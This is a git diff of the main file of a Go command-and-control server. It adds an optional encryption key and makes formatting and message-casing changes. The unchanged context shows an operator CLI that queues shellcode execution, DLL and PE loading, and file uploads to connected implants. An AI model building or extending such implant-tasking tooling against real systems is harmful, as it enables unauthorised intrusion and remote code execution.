@@ -15,8 +15,11 @@ import (
 	"github.com/carved4/carved/server/pkg/db"
 	"github.com/carved4/carved/server/pkg/listeners"
 	"github.com/carved4/carved/server/pkg/web"
+	"github.com/carved4/carved/shared/crypto"
 	"github.com/carved4/carved/shared/proto"
 )
+
+var EncryptionKey = ""
 
 func main() {
 
@@ -36,6 +39,14 @@ func main() {
 ░ ░            ░  ░   ░           ░     ░  ░   ░
 ░                                ░           ░      `)
 
+	if EncryptionKey != "" {
+		if err := crypto.SetKey(EncryptionKey); err != nil {
+			fmt.Printf("[-] invalid encryption key: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Println("[+] encryption enabled")
+	}
+
 	fmt.Printf("[+] initializing database: %s\n", *dbPath)
 	if err := db.Init(*dbPath); err != nil {
 		fmt.Printf("[-] database init failed: %v\n", err)
@@ -46,24 +57,24 @@ func main() {
 	lm := listeners.NewManager()
 
 	defaultListener := &db.Listener{
-		ID:      "default",
-		Name:    "default",
-		Type:    "http",
-		Host:    "0.0.0.0",
-		Port:    uint16(*listenerPort),
-		Active:  true,
-		Created: time.Now(),
+		ID:		"default",
+		Name:		"default",
+		Type:		"http",
+		Host:		"0.0.0.0",
+		Port:		uint16(*listenerPort),
+		Active:		true,
+		Created:	time.Now(),
 	}
 	lm.Start(defaultListener)
 
 	apiServer := api.NewServer(lm)
 
 	apiAddr := fmt.Sprintf(":%d", *apiPort)
-	fmt.Printf("[+] starting API server on %s\n", apiAddr)
+	fmt.Printf("[+] starting api server on %s\n", apiAddr)
 
 	go func() {
 		if err := http.ListenAndServe(apiAddr, apiServer.Router()); err != nil {
-			fmt.Printf("[-] API server error: %v\n", err)
+			fmt.Printf("[-] api server error: %v\n", err)
 		}
 	}()
 
@@ -172,7 +183,7 @@ func runCLI() {
 			}
 			data, err := os.ReadFile(args[0])
 			if err != nil {
-				fmt.Printf("[-] Failed to read file: %v\n", err)
+				fmt.Printf("[-] failed to read file: %v\n", err)
 				continue
 			}
 			queueTask(proto.TaskUpload, []string{args[1]}, data)
@@ -211,7 +222,7 @@ func runCLI() {
 			}
 			data, err := os.ReadFile(args[0])
 			if err != nil {
-				fmt.Printf("[-] Failed to read shellcode: %v\n", err)
+				fmt.Printf("[-] failed to read shellcode: %v\n", err)
 				continue
 			}
 			queueTask(proto.TaskExecute, nil, data)
@@ -222,7 +233,7 @@ func runCLI() {
 			}
 			data, err := os.ReadFile(args[0])
 			if err != nil {
-				fmt.Printf("[-] Failed to read DLL: %v\n", err)
+				fmt.Printf("[-] failed to read dll: %v\n", err)
 				continue
 			}
 			queueTask(proto.TaskLoadDLL, nil, data)
@@ -233,7 +244,7 @@ func runCLI() {
 			}
 			data, err := os.ReadFile(args[0])
 			if err != nil {
-				fmt.Printf("[-] Failed to read PE: %v\n", err)
+				fmt.Printf("[-] failed to read pe: %v\n", err)
 				continue
 			}
 			queueTask(proto.TaskLoadPE, nil, data)
@@ -241,7 +252,7 @@ func runCLI() {
 			if currentImplant != nil {
 				currentImplant = nil
 			} else {
-				fmt.Println("[*] Bye!")
+				fmt.Println("[*] bye!")
 				os.Exit(0)
 			}
 		default:
@@ -431,3 +442,4 @@ func queueTask(taskType proto.TaskType, args []string, data []byte) {
 	}
 	fmt.Printf("[+] task queued: %s\n", task.ID[:8])
 }
+
